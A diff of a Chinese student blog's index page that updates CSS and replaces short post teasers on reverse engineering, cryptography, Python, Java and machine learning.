@@ -75,7 +75,119 @@
   </style>
 </noscript>
 
-<link rel="alternate" href="/atom.xml" title="v5le0n9's garden" type="application/atom+xml">
+<style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style><link rel="alternate" href="/atom.xml" title="v5le0n9's garden" type="application/atom+xml">
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -187,7 +299,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/posts/65ab04eb.html">
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/855b12c4.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -201,7 +313,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/posts/65ab04eb.html" class="post-title-link" itemprop="url">第四课——去程序自校验</a>
+            <a href="/posts/855b12c4.html" class="post-title-link" itemprop="url">RSA算法</a>
         </h2>
 
         <div class="post-meta">
@@ -210,378 +322,23 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-04-05 09:29:28 / 修改时间：12:32:58" itemprop="dateCreated datePublished" datetime="2022-04-05T09:29:28+08:00">2022-04-05</time>
+              <time title="创建时间：2022-04-05 09:29:27" itemprop="dateCreated datePublished" datetime="2022-04-05T09:29:27+08:00">2022-04-05</time>
             </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Windows%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">Windows逆向</span></a>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
                 </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-11 13:27:08" itemprop="dateModified" datetime="2022-04-11T13:27:08+08:00">2022-04-11</time>
               </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>7.9k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>7 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>破解豪迪群发器。</p>
-<p>打开注册页面，随便输入注册码，会出现以下：</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/posts/65ab04eb.html#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/posts/7cd35487.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="v5le0n9">
-      <meta itemprop="description" content="v5le0n9's garden">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="v5le0n9's garden">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/posts/7cd35487.html" class="post-title-link" itemprop="url">第二三课——去弹窗、主页锁定及DIY</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-04-05 09:29:28 / 修改时间：12:32:53" itemprop="dateCreated datePublished" datetime="2022-04-05T09:29:28+08:00">2022-04-05</time>
-            </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Windows%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">Windows逆向</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>11k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>10 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="1-了解Windows-API"><a href="#1-了解Windows-API" class="headerlink" title="1. 了解Windows API"></a>1. 了解Windows API</h1><p>消息框：MessageBoxA/W（Ansi[ASCII]/WideChar[Unicode]）</p>
-<p>弹页面：</p>
-<p>ShellExecuteA/W：open url——控制台执行</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/posts/7cd35487.html#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/posts/e2d652c5.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="v5le0n9">
-      <meta itemprop="description" content="v5le0n9's garden">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="v5le0n9's garden">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/posts/e2d652c5.html" class="post-title-link" itemprop="url">第一课——脱壳基础</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-04-05 09:29:28 / 修改时间：12:32:49" itemprop="dateCreated datePublished" datetime="2022-04-05T09:29:28+08:00">2022-04-05</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Windows%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">Windows逆向</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>56k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>51 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="1-程序是什么语言编译的"><a href="#1-程序是什么语言编译的" class="headerlink" title="1. 程序是什么语言编译的"></a>1. 程序是什么语言编译的</h1><p>从目前国内接触到程序看，比较流行的编译器有：VC系列、易语言、.NET、Delphi，一些曾经用的很多但渐渐少了有：VB、ASM、BC++，还有一些用的比较少的有：AutoIt、PB、QT等，下面提供一些实例，结合实例来看看“入口点代码”、“程序区段”和“加载模块”等特征。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/posts/e2d652c5.html#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/posts/b80b3bc2.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="v5le0n9">
-      <meta itemprop="description" content="v5le0n9's garden">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="v5le0n9's garden">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/posts/b80b3bc2.html" class="post-title-link" itemprop="url">创建留言板</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-04-05 09:29:28 / 修改时间：12:32:45" itemprop="dateCreated datePublished" datetime="2022-04-05T09:29:28+08:00">2022-04-05</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%BC%80%E5%8F%91/" itemprop="url" rel="index"><span itemprop="name">开发</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>4.7k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>4 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>//在Ubuntu环境下后端用MySQL，前端用HTML和PHP</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su	//进入根目录</span><br><span class="line">mysql -uroot -p123456	//进入MySQL</span><br></pre></td></tr></table></figure>
-<p>数据库和文件一定要在同一主机，并且将文件放在/var/www/html下，打开文件要走apache，即要在URL上输入路径，不能直接打开本地的html文件。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/posts/b80b3bc2.html#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/posts/9589547b.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="v5le0n9">
-      <meta itemprop="description" content="v5le0n9's garden">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="v5le0n9's garden">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/posts/9589547b.html" class="post-title-link" itemprop="url">黑客丛林之旅小游戏</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-04-05 09:29:28 / 修改时间：13:35:17" itemprop="dateCreated datePublished" datetime="2022-04-05T09:29:28+08:00">2022-04-05</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BB%BC%E5%90%88/" itemprop="url" rel="index"><span itemprop="name">综合</span></a>
+                  <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
                 </span>
             </span>
 
@@ -610,14 +367,296 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p><a target="_blank" rel="noopener" href="http://www.fj543.com/hack/">黑客丛林之旅</a></p>
-<p>1-<a target="_blank" rel="noopener" href="http://www.fj543.com/hack/?level=1">http://www.fj543.com/hack/?level=1</a></p>
-<blockquote>
-<p>提示语：在浏览器端用脚本进行身份验证是很容易被破解的。(The Client-side authentication is not secure) </p>
-</blockquote>
+          <p>我是悟出一个道理了，搞安全的逃不过各种密码算法，密码学一定要给我捡起来！！本来想在这里上传我的密码学笔记的，但是图片太多不想搞，放在CSDN博客也有一些兼容性问题。</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/posts/9589547b.html#more" rel="contents">
+              <a class="btn" href="/posts/855b12c4.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/e39e2a4e.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="v5le0n9">
+      <meta itemprop="description" content="v5le0n9's garden">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v5le0n9's garden">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/e39e2a4e.html" class="post-title-link" itemprop="url">Python学习</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-05 09:29:27" itemprop="dateCreated datePublished" datetime="2022-04-05T09:29:27+08:00">2022-04-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-11 13:27:04" itemprop="dateModified" datetime="2022-04-11T13:27:04+08:00">2022-04-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%BC%80%E5%8F%91/" itemprop="url" rel="index"><span itemprop="name">开发</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>54k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>49 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Python作为我学习的第三门语言，感觉它与Java还是有些相似之处，所以3天内学完Python对我来说还可以接受，关键是读写文件那里还是有些许不懂的地方。之所以学习Python，是因为我们专业开了一门机器学习的课，老师要求用Python编写程序，另一门课也涉及到爬虫之类。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/e39e2a4e.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/33a085c7.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="v5le0n9">
+      <meta itemprop="description" content="v5le0n9's garden">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v5le0n9's garden">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/33a085c7.html" class="post-title-link" itemprop="url">调试器使用教程</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-05 09:29:27" itemprop="dateCreated datePublished" datetime="2022-04-05T09:29:27+08:00">2022-04-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-11 13:26:58" itemprop="dateModified" datetime="2022-04-11T13:26:58+08:00">2022-04-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Windows%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">Windows逆向</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>98k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1:30</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>做CTF的逆向题时苦于对大佬们的wp各种看不懂，只因自己太菜跟不上大佬的节奏，所以才写了这一篇最最最基础的，保姆级的，手把手教的，看完包会的调试器使用教程。其中重点讲OllyDbg，参考看雪的书《加密与解密》，参考小甲鱼的视频《OD使用教程》做的笔记，其次做了一些x64dbg与OD有区别的笔记。希望这篇文章不仅能帮助你们看懂大佬们的wp，而且可以自己实现逆向破解，一起加油吧！</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/33a085c7.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/784f7e1d.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="v5le0n9">
+      <meta itemprop="description" content="v5le0n9's garden">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v5le0n9's garden">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/784f7e1d.html" class="post-title-link" itemprop="url">.Net逆向教程</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-05 09:29:27" itemprop="dateCreated datePublished" datetime="2022-04-05T09:29:27+08:00">2022-04-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-11 13:26:51" itemprop="dateModified" datetime="2022-04-11T13:26:51+08:00">2022-04-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Windows%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">Windows逆向</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><code>.Net</code>程序载入OD直接就运行起来了，完全没给我们调试的机会。针对这种程序，其实有专门的调试软件，比如dnSpy。其实调试流程跟OD差不多，在此只是熟悉一下dnSpy的运用。</p>
+<p>这个笔记是跟着up主muruoxi学习<code>.Net</code>逆向，<a target="_blank" rel="noopener" href="https://www.bilibili.com/read/readlist/rl73962?spm_id_from=333.999.0.0">这是她的.Net逆向专栏</a> 。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/784f7e1d.html#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -664,10 +703,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-04-05 09:29:27 / 修改时间：12:32:24" itemprop="dateCreated datePublished" datetime="2022-04-05T09:29:27+08:00">2022-04-05</time>
+              <time title="创建时间：2022-04-05 09:29:27" itemprop="dateCreated datePublished" datetime="2022-04-05T09:29:27+08:00">2022-04-05</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-11 13:26:48" itemprop="dateModified" datetime="2022-04-11T13:26:48+08:00">2022-04-11</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -732,7 +777,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/posts/54924480.html">
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/e955b133.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -746,7 +791,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/posts/54924480.html" class="post-title-link" itemprop="url">Web渗透</a>
+            <a href="/posts/e955b133.html" class="post-title-link" itemprop="url">k-近邻算法</a>
         </h2>
 
         <div class="post-meta">
@@ -755,17 +800,23 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-04-05 09:29:27 / 修改时间：13:26:11" itemprop="dateCreated datePublished" datetime="2022-04-05T09:29:27+08:00">2022-04-05</time>
+              <time title="创建时间：2022-04-05 09:29:27" itemprop="dateCreated datePublished" datetime="2022-04-05T09:29:27+08:00">2022-04-05</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-11 13:26:45" itemprop="dateModified" datetime="2022-04-11T13:26:45+08:00">2022-04-11</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">漏洞渗透</span></a>
+                  <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
                 </span>
             </span>
 
@@ -775,14 +826,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>135k</span>
+              <span>2.7k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2:03</span>
+              <span>2 分钟</span>
             </span>
 
         </div>
@@ -794,12 +845,10 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>文章知识点建立在OWASPBWA靶机与CTFHub实验的基础上。</p>
-<p>总实验准备：</p>
-<p>kali虚拟机、OWASPBWA靶机、win10、XShell</p>
+          <p>这周又来个新作业，k-近邻算法手算很容易，但用代码实现确实有点困难了。只能在网上找找参考：<a target="_blank" rel="noopener" href="https://github.com/zlxy9892/ml_code/blob/master/basic_algorithm/knn">https://github.com/zlxy9892/ml_code/blob/master/basic_algorithm/knn</a> 看能不能看懂牛牛们写的算法吧。</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/posts/54924480.html#more" rel="contents">
+              <a class="btn" href="/posts/e955b133.html#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -823,7 +872,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/posts/33a085c7.html">
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/8df0ec14.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -837,7 +886,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/posts/33a085c7.html" class="post-title-link" itemprop="url">调试器使用教程</a>
+            <a href="/posts/8df0ec14.html" class="post-title-link" itemprop="url">Java学习</a>
         </h2>
 
         <div class="post-meta">
@@ -846,17 +895,23 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-04-05 09:29:27 / 修改时间：12:31:43" itemprop="dateCreated datePublished" datetime="2022-04-05T09:29:27+08:00">2022-04-05</time>
+              <time title="创建时间：2022-04-05 09:29:27" itemprop="dateCreated datePublished" datetime="2022-04-05T09:29:27+08:00">2022-04-05</time>
             </span>
+              <span class="post-meta-item">
